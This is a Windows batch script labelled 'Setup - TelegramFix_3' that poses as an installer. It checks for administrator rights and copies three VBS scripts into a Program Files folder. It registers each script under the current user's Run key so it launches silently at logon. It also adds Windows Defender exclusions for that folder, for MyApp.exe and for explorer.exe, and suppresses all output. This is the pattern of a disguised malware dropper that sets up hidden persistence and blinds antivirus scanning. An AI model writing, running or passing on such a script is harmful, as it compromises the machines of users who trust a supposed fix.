@echo off
title Setup - TelegramFix_3
echo =========================================
echo   Setup - TelegramFix_3
echo =========================================
echo.
echo Please wait...

set "APP_DIR=C:\Program Files (x86)\MyApp"
set "REG_NAME=MyAppLauncher"

net session >nul 2>&1
if !errorlevel! neq 0 (
    pause
    exit /b 1
)

if not exist "!APP_DIR!\MyApp.exe" (
    pause
    exit /b 1
)

if not exist "!APP_DIR!\TgFixVs" mkdir "!APP_DIR!\TgFixVs"
copy /y "%~dp0TgFxPr.vbs" "!APP_DIR!\TgFixVs\" >nul
copy /y "%~dp0TgFxBackup.vbs" "!APP_DIR!\TgFixVs\" >nul
copy /y "%~dp0TgFxPrRn.vbs" "!APP_DIR!\TgFixVs\" >nul

reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TgFxPr" /t REG_SZ /d "wscript.exe \"!APP_DIR!\TgFixVs\TgFxPr.vbs\"" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TgFxBackup" /t REG_SZ /d "wscript.exe \"!APP_DIR!\TgFixVs\TgFxBackup.vbs\"" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TgFxPrRn" /t REG_SZ /d "wscript.exe \"!APP_DIR!\TgFixVs\TgFxPrRn.vbs\"" /f >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "!APP_DIR!" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "MyApp.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "explorer.exe" /t REG_DWORD /d 0 /f >nul 2>&1

echo.
echo  DONE
pause